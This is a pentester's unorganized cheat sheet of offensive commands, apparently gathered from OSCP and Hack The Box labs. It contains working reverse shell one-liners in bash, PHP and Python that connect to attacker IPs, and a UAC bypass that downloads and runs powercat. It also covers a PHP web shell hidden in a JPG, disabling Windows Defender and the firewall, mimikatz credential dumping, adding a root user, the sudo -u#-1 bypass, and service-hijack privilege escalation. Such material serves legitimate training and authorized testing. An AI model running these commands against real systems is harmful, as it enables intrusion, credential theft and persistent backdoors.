# Intro

This is a very unorganized collection of usefull commands and other stuff I've come accross while pentesting. Some are obvious some are no :D 

# Bypass File Upload Filtering 

More in detail <https://xapax.gitbooks.io/security/content/bypass_image_upload.html>

## PHP in JPG
```bash
exiftool -Comment='<?php echo system($_GET['cmd']); ?>' pwn.jpg
```

# Find Subdomains

## wfuzz
```bash
wfuzz -c -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://forwardslash.htb -H "Host: FUZZ.forwardslash.htb" --hh 0
```

# DNS

## nslookup
```bash
> SERVER 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
```

## dig
```bash
dig axfr cronos.htb @10.10.10.13
```

## Find DNS server in a network
```
for ip in $(seq 1 255); do echo $ip; host 10.11.1.72 10.11.1.$ip; done
```

## Find all hostnames in a range with known DNS IP
```
for ip in $(seq 1 255); do host <NETWORK>.$ip <DNS>; done | grep "domain name from pointer"
```

# tcpdump

## HTTP requests
```bash
# GET
sudo /sbin/tcpdump -i tun0 -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'
# POST
sudo /sbin/tcpdump -i tun0 -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354'
```

# nmap

## HELP

Print only the names of the NSE scripts:
```
nmap --script-help *<STRING>* | grep -e "^\S" | grep -v https | grep -v Categories
```

## poor man's nmap
```bash
for i in `seq 1 65534` ; do echo $i; nc -nvzw 1 10.3.3.14 $i 2>&1 | grep -v timed ; done
```

# nikto

- If the https enumeration does not work try changing MinProtocol value from TLSv1.2 to TLSv1.0 in /etc/ssl/openssl.cnf

# Login Brute Force
```
hydra -L users.lst -P chatpws.lst internal-01.bart.htb http-post-form "/simple_chat/login_form.php:uname=^USER^&passwd=^PASS^&submit=Login:Invalid Username or Password"
```

# Password Cracking

## hydra
```
hydra -V -t 4 -f -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.202 -m /localstart.asp http-get
```

## john
```
unshadow shadow.txt passwd.txt > pws.txt
john --wordlist=/usr/share/wordlists/rockyou.txt pws.txt

# mutate list
john --wordlist=users2.txt --rules --stdout > pws2.txt
```

# OpenSSL

## Print certificate values
```
openssl x509 -in cert.pem -text
```

# SQLi

## sqlmap

- Use File as a source for a post request.
```
# request.txt
POST /results.php HTTP/1.1
Host: 10.10.10.6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.6/search.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Connection: keep-alive
Cookie: PHPSESSID=s3c24pfnbkg60borq73ra73n3f
Upgrade-Insecure-Requests: 1

search=Donald
```
```bash
# Dump all DBs
sqlmap -r request.txt --dbs --level=5 --risk=3 --tamper=space2comment
# Choose a DB
sqlmap -r request.txt -D <DB> --dump-all
```

## Enable xp_cmdshell
```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

# smbclient

If you get "Cannot connect to server.  Error was NT_STATUS_CONNECTION_DISCONNECTED", add this to smb.conf under global section:
```
client min protocol = LANMAN1
```

# snmpwalk

Enumerate the entire tree:
```
snmpwalk -c public -v1 10.11.1.219
```

OS Information:
```
snmpwalk -c public -v1 10.11.1.241 1.3.6.1.2.1.1.1.0
```

Windows Users:
```
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25
```

Windows Processes:
```
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2
```

Windows Partitions:
```
wmic logicaldisk get caption
```

Open TCP Ports
```
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3
```

Open UDP Ports
```
snmpwalk -c public -v1 10.11.1.241 1.3.6.1.2.1.7.5.1.2
```

Installed Software
```
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
```

# msfvenom

## List all payloads
```
msfvenom -l PAYLOAD
```

## cheetsheet

- <https://burmat.gitbook.io/security/hacking/msfvenom-cheetsheet>
- <https://hackingandsecurity.blogspot.com/2016/04/msfpayload-and-msfencode-have-1en.html?m=1>

## List payload sizes
```
ruby /usr/share/metasploit-framework/tools/modules/payload_lengths.rb
```

## Shellcode
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.242 LPORT=443 -f python -v payload -b '\x09\x0a\x0b\x0c\x0d\x20' EXITFUNC=thread
```

# Kerberos

## Enum users
```
nmap --script krb5-enum-users --script-args krb5-enum-users.realm=<DOMAIN> -p 88 -Pn 10.11.1.220
```

# LDAP

- Get Naming Contexts
```bash
ldapsearch -x -h <IP> -p 389 -s base namingcontexts
```
- Enumerate:
```bash
ldapsearch -x -h <IP> -p 389 -b <PREV_RES>
```

# WordPress

## Scan a WordPress site
```
wpscan –url <URL> –enumerate u
```

# Quick Server

## Python
```bash
python -m SimpleHTTPServer 8080
```

## PHP
```bash
php -S 127.0.0.1:80802
```

# Linux 

## sudo Security Bypass
if user is allowd to run `(ALL, !root) /bin/bash` as sudo (can't run /bin/bash as sudo):
```bash
sudo -u#-1 /bin/bash
```
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id and /bin/bash is executed with root permission

<https://www.exploit-db.com/exploits/47502>

## Download file using nc
```bash
# on attacker side 
nc -lp 4444 > FILENAME
# on victim side
nc IP PORT < FILE
```

## Reverse shell
```
/bin/bash -c 'bash -i > /dev/tcp/192.168.119.239/443 0>&1'
php -r '$sock=fsockopen("10.10.14.18",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## List sudo binaries "runnable" by the active user
```
sudo -l
```

## Add new root user to /etc/passwd
```bash
openssl passwd -1 -salt pwned pwned
echo 'pwned:$1$pwned$V5p85o3GJTqCdLKXQNm2T0:0:0:/root/root:/bin/sh' > pwned
```

## Print OS infos
```
cat /etc/os-release
cat /etc/issue
lsb_release -a
uname -a
```

## Files run as root/SUID/GUID
```
find / -perm -2000 -user root -type f -print 2>/dev/null
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```

## World writable folders
```
# world-writeable folders
find / -writable -type d 2>/dev/null    
# world-writeable folders
find / -perm -222 -type d 2>/dev/null
# world-writeable folders     
find / -perm -o w -type d 2>/dev/null
# world-executable folders
find / -perm -o x -type d 2>/dev/null
# world-writeable & executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

## SUID binaries that led to priv esc
- pkexec
- nmap
- vim

## Spawning a TTY

### From shell
```
python -c 'import pty; pty.spawn("/bin/sh")'
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<MY_IP>:<PORT>
/bin/sh -i
perl —e 'exec "/bin/bash";'
echo os.system('/bin/bash')
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
```

### In vi
```
:!bash
:set shell=/bin/bash:shell
```

### In nmap
```
!sh
```

### In nano
```
^R^X
reset; sh 1>&0 2>&0
```

## Shelshock
https://github.com/nccgroup/shocker
```
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi
python shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
```

## docker
If the user is member of docker group:
```
docker run -v /etc/:/mnt -it alpine
```

## Empty capabilities (=ep)
```bash
# If getcap contains e.g. /home/user/openssl =ep

# Make some SSL certificate
openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes

# Start SSL Server in root directory
cd /
/home/user/openssl openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP
# Now we can read any file, with curl (use '-k' to ignore ssl trust issues)
curl -k https://localhost:1337/etc/shadow

# Add entries to shadow file
# We are reusing the certificates created before
openssl smime -encrypt -aes256 -in /home/user/shadow.custom -binary -outform DER -out /home/user/shadow.custom.enc /tmp/cert.pem
/home/user/openssl smime -decrypt -in /home/user/shadow.custom -inform DER -inkey /tmp/key.pem -out /etc/shadow
```


# Windows

## Powershell

### Get Environment Variables
```
Get-ChildItem -Path Env:\
```

### Import Powershell Credentials from File and print Username and Password
```
$credential = Import-Clixml -PATH <PATH_TO_XML_FILE>
$credential.GetNetworkCredential().Username
$credential.GetNetworkCredential().Password
```

## whoami
```bash 
whoami /user
whoami /groups
whomai /priv2

# this also might work
echo %USERDOMAIN%\%USERNAME%
```

## Disable Windows Firewall and Windows Defender (Windows Server 2019 & Windows 10)
```
netsh advfirewall set  currentprofile state off
Set-MpPreference -DisableRealtimeMonitoring $true
```

## mimikatz

logonpasswords:
```
sekurlsa::logonpasswords
```

Kerberos Tickets:
```
sekurlsa::tickets </export>
```

## Domain User enumeration

Show domain user info:
```
net user <USER> /domain
```

Show users in a domain group:
```
net group <DOMAIN_GROUP_NAME> /domain 
```

Add a new administrator user:
```
net user username <password> /add
net localgroup administrators username /add
net localgroup "Remote Desktop Users" username /add
```

## Bypass UAC

- Documentation found on <https://www.puckiestyle.nl/uac/>. Run webserver for powercat and reverse shell listener:
```
BypassUAC-CMSTP -comando "powershell.exe -NoP -exec Bypass IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.239/powercat.ps1');powercat -c 192.168.119.239 -p 4444 -e cmd"
```

## Find writable folders:
```
dir /ad-r /s /b
```

## Writeable folder could be found by:
```
cd %TEMP%
```

## Download File

### Powershell
```
Invoke-WebRequest -UseBasicParsing <URL> -OutFile <FILENAME>
```

### Certutil
```
certutil.exe -urlcache -split -f "http://192.168.119.239/winPEAS.exe" winpeas.exe
```

### FTP from file

- Windows:
```
echo open 10.10.14.10 > pwn & echo.  >> pwn & echo user anonymous >> pwn & echo.  >> pwn & echo bin >> pwn & echo get bla.exe >> pwn & echo bye >> pwn
```


## Port Forwarding with plink
```
plink.exe -l SSH_USERNAME -pw PASSWORD -R MY_IP:8888:127.0.0.1:8888 MY_IP
```

## WinRM
If port 5985 (WinRM) is open, you can use evil-winrm to get a remote shell if you have the user credentials.

## Privilege Escalation

- SeImpersonatePrivilege enabled:
```
PsExec64.exe -i -u "nt authority\system" cmd.exe
```
- JuicyPotato - CLSID list <http://ohpe.it/juicy-potato/CLSID/>
```
juicy.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\windows\temp\nc.exe 192.168.119.239 4443 -e cmd.exe" -t *
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

## System enumeration

### System info
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### Windows XP
```
C:\WINDOWS\system32\eula.txt
```

### Windows 7/10
```
C:\Windows\System32\license.rtf
```

## Search for files
```shell
dir /s /b proof.txt
```

```powershell
Get-ChildItem C:\Windows\*\
```

## List all ENV Variables
```
set 
```

## Display onwership
```
dir /q calc.exe
```

## File all listening ports and filter by strings
```
netstat -aon | find /i "listening" | findstr 127.0.0.1
```

## Find out the used open ports in Windows
```
netstat -an | find /i "Listening"
netstat -an | find /i "Established"
```

## Enumerate Windows services
```
takslist /svc
```

## Query the config information for a specific service
```
sc qc algsi
```

## UsoSvc Privilege escalation
```
sc.exe config usosvc binPath="C:\tmp\nc.exe 10.10.14.18 4444 -e powershell.exe"
sc.exe stop usosvc
sc.exe start usosvc
```

## List security policy / users
```
net accounts
net users
```

## Display the username/domain your are currently logged in with (if there is no whoami)
```
echo %USERDOMAIN%\%USERNAME%
```

## List privileges via cmd
```
cacls *
cacls "C:\Program Files" /T | findstr Users
cacls *.exe | findstr "IUSR_BOB:F"  ## lists permissions of *.exe and searches for the user and his full permissions string "IUSR_BOB:F". 

```

## search for passwords in the Windows Registry
```
reg query "HKLM\Software\Microsoft\WindowsNT\Currentversion\Winlogon"
reg query "HKLM\System\CurrentControlSet\Services\SNMP"
```

## Display the hosts file
```
type C:\Windows\system32\drivers\etc\hosts
type c:\Winnt\system32\drivers\etc\hosts   //Windows 2000
```

## Port Forwarding

A single port:
```
netsh interface portproxy add v4tov4 listenport=50021 listenaddress=10.11.1.31 connectport=21 connectaddress=10.1.1.27
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.1.31 localport=50021 action=allow
```
Show all:
```
netsh interface portproxy show all
```
Delete one:
```
netsh interface portproxy delete v4tov4 listenport=50022
```

# Buffer Overflow

## Registers

- EAX (accumulator): Arithmetical and logical instructions
- EBX (base): Base pointer for memory addresses
- ECX (counter): Loop, shift, and rotation counter
- EDX (data): I/O port addressing, multiplication, and division
- ESI (source index): Pointer addressing of data and source in string copy operations
- EDI (destination index): Pointer addressing of data and destination in string copy operations

## Immunity Debugger
```bash
# Find modules
!mona find modules

# Find JMP ESP in a DLL
!mona find -s "\xff\xe4" -l <DLL>

# Show Executable modules
View -> Executable Modules (Alt + E)
```

## Bad Chars String
```python
import array
def get_chars(badchars):
    chars = []
    for i in range(0,256):
        if i not in badchars:
            chars.append(i)
    return array.array("B", chars).tostring()

get_chars([0x00,...])
```

## Metasploit modules for Buffer Overflow
```bash
# create EIP finding pattern
msf-pattern_create -l <LENGTH>
# get offset for EIP based on pattern
msf-pattern_offset -l <LENGTH> -q <VALUE>
# get byte codes for instructions
msf-nasm_shell
```


# Helpful links

<https://github.com/swisskyrepo/PayloadsAllTheThings>
<https://github.com/Optixal/OSCP-PWK-Notes-Public>
<https://github.com/doffensive/wired-courtyard>

## Windows Privilege Escalation
<https://github.com/xapax/security/blob/master/privilege_escalation_windows.md>

- Windows Privilege Escalation Checks
<https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/>

## MS SQL Injection 
<https://www.exploit-db.com/papers/12975>

## Union based SQL Injection
<https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html>

## Cracking Hashes:
<https://crackstation.net/>

## GTFOBins
<https://gtfobins.github.io/#>

## Filter evasion with PHP wrapper and filter
<https://www.php.net/manual/de/wrappers.php.php>

## Netstat without Netstat
<https://staaldraad.github.io/2017/12/20/netstat-without-netstat/>
